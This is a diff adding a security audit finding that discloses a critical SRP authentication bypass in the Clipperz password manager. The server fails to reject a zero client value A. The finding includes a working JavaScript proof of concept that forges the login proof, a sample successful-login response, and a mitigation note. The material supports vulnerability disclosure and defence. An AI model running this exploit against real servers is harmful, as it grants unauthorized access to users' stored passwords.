@@ -1,0 +1,88 @@
+CLP-01-017 SRP Authentication Bypass (Critical)
+
+The Clipperz application implements the Secure Remote Password protocol
+for authentication. The specification explicitly states that the
+parameter A provided by the client must not be zero. The Clipperz
+implementation omits this check, which makes password verification
+trivial to bypass.
+
+According to the SRP-6 specification, the shared secret is on the server
+side calculated as (Avu)b where A is supplied by the client. If A is
+zero the result is also zero, and the resulting shared key is H(0). The
+corresponding proof can easily be calculated by the attacker as H(0 | B
+| H(0)). The following JavaScript function can be run in the console
+when on the Clipperz login page. While the page itself is not updated,
+the resulting JSON response clearly indicates a successful login.
+
+SRP authentication bypass PoC:
+
+(function PoC(){
+  function send(m,p){
+    x=new XMLHttpRequest();
+    x.open('post','/json',false);
+    x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    x.send('method='+m+'&parameters='+urlEncode(JSON.stringify(p)));
+    return JSON.parse(x.responseText);
+  }
+  r=send('knock',{"requestType":"CONNECT"});
+
+  r=send('handshake',{"parameters":
+   {"message":"connect",
+    "version":"0.2",
+    "parameters":
+
+{"C":"97766a7e1814fa3042c48869a314f9bde76ab48a57fb1ee54e874aadb76544f6",
+       "A":"0"}},
+    "toll":new Clipperz.PM.Toll(r.toll).deferredPay().results[0]});
+
+  B=new Clipperz.Crypto.BigInt(r.result.B,16).asString();
+  S=new Clipperz.ByteArray("0")
+  K=Clipperz.Crypto.SHA.sha_d256(S).toHexString().substring(2);
+  M1=new Clipperz.ByteArray("0"+B+K)
+  M1=Clipperz.Crypto.SHA.sha_d256(M1).toHexString().substring(2);
+  return send('handshake',{"parameters":
+    {"message":"credentialCheck",
+     "version":"0.2",
+     "parameters":{"M1":M1}},
+     "toll":new Clipperz.PM.Toll(r.toll).deferredPay().results[0]});
+})()
+
+Example JSON response:
+
+{"result":
+  {"subscription":
+    {"fromDate":"Mon, 28 April 2014 13:20:56 UTC",
+     "features":["OFFLINE_COPY","LIST_CARDS"],
+     "toDate":"Mon, 01 January 4001 00:00:00 UTC",
+     "type":"EARLY_ADOPTER"},
+   "loginInfo":
+     {"current":
+       {"operatingSystem":"LINUX",
+        "disconnectionType":"STILL_CONNECTED",
+        "browser":"FIREFOX",
+        "connectionType":"LOGIN",
+        "date":"Tue, 06 May 2014 03:09:28 UTC",
+        "country":"SE",
+        "ip":"83.248.183.26"},
+      "latest":
+        {"operatingSystem":"LINUX",
+         "disconnectionType":"SESSION_EXPIRED",
+         "browser":"FIREFOX",
+         "connectionType":"LOGIN",
+         "date":"Tue, 06 May 2014 02:16:36 UTC",
+         "country":"SE",
+         "ip":"83.248.183.26"}},
+   "connectionId":
+   "35defbcf6616c469aeb404e899b057fa2fdf2595c20b56a3c78407947a16dd86",
+   "lock":"8404A584-AE8A-2AEB-3B1F-066D4A3FF271",
+   "offlineCopyNeeded":true,
+   "M2":"de8e70e96b860f703417dd27e7d4233c9bdab503c58cb89d5bddcbd8ed93fb97"},
+   "toll":
+   {"targetValue":
+     "2e563d96bac476777ef9338153048b17f84055ec2a7f4e8b47142e518eff26b5",
+     "requestType":"MESSAGE",
+     "cost":2}
+}
+
+To mitigate the issue sufficiently, the server needs to verify that A
+cannot be 0 so the attack cannot be carried out.
